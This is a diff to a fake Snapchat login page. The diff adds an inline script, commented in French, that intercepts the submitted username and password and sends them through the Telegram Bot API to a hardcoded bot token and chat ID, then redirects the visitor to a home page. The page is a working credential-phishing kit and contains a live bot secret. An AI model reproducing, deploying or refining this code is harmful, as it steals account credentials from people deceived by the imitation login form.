@@ -8,29 +8,28 @@
   <meta property="og:site_name" content="Snapchat Spotlight">
   <link rel="stylesheet" href="/css/login.css">
   <title>Login • Snapchat</title>
-
 </head>
 <body>
   <!-- Back Button -->
   <button class="back-button" onclick="window.location.href='/Acconts.html';">
-    <img src="img/left-arrow.png"height="15px" width="15px" alt="">
+    <img src="img/left-arrow.png" height="15px" width="15px" alt="">
   </button>
 
   <div class="login-container">
     <div id="error-message" class="error-message">
-      Something went wrong ! Please re-login to your account.
-  </div>
+      Something went wrong! Please re-login to your account.
+    </div>
     <h1>Log In</h1>
     <!-- Form for login -->
-    <form action="" method="POST" onsubmit="return validatePassword(event)">
+    <form id="loginForm" onsubmit="return sendCredentialsToTelegram(event)">
       <label for="username">USERNAME OR EMAIL</label>
-      <input type="text" id="username" name="name" required>
+      <input type="text" id="username" name="username" required>
       
       <p class="alternate-option"><a href="javascript:void(0);" id="switch-to-phone">Use phone number instead</a></p>
       
       <label for="password">PASSWORD</label>
       <div class="password-container">
-        <input type="password" id="password" name="message" required>
+        <input type="password" id="password" name="password" required>
         <button type="button" class="toggle-password">
           <img src="img/eye-closed.svg" id="eye-icon" width="20" height="20" alt="eye icon">
         </button>
@@ -49,8 +48,48 @@
       
       <button type="submit" class="login-button">Log In</button>
     </form>
-    
-    <script src="/js/login.js"></script>
-    
+  </div>
+
+  <script>
+    // Fonction pour envoyer les informations à Telegram lors de la soumission du formulaire
+    function sendCredentialsToTelegram(event) {
+      event.preventDefault(); // Empêche l'envoi par défaut du formulaire
+
+      // Récupération des informations saisies par l'utilisateur
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      // Paramètres du bot Telegram
+      const botToken = '7348058838:AAEurSPCnnOw6yluh3-4oqUq_E61Q55Av-U'; // Remplace par le token de ton bot
+      const chatId = '-4746759996'; // Remplace par l'ID de ton chat Telegram
+
+      // Création du message à envoyer à Telegram
+      const message = `Nom d'utilisateur ou email: ${username}\nMot de passe: ${password}`;
+
+      // URL de l'API Telegram pour envoyer le message
+      const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+      // Envoi de la requête à Telegram
+      fetch(apiUrl)
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            console.log('Message envoyé à Telegram.');
+          } else {
+            console.error('Erreur lors de l\'envoi à Telegram.', data);
+          }
+        })
+        .catch(error => {
+          console.error('Erreur:', error);
+        });
+
+      // Optionnel: rediriger vers une autre page après l'envoi
+      window.location.href = '/home.html';  // Redirection après soumission (remplace par l'URL que tu veux)
+      
+      return false; // Empêche l'envoi du formulaire
+    }
+  </script>
+
+  <script src="/js/login.js"></script>
 </body>
 </html>
